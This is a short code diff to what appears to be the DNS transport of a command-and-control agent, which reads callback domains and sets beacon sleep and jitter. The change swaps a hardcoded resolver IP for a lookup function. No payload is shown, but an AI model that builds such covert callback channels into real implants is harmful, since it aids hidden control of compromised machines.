@@ -80,7 +80,7 @@ namespace DnsTransport
             // Necessary to disable certificate validation
             domains = data["callback_domains"].Split(',').ToList();
             this.next_msg_queue = new int[this.max_threads_conn];
-            dnsRip = new DnsRip.Resolver("192.168.15.18");
+            dnsRip = new DnsRip.Resolver(GetDnsAddress());
             reset_init_all();
             Agent.SetSleep(CallbackInterval, CallbackJitter);
         }
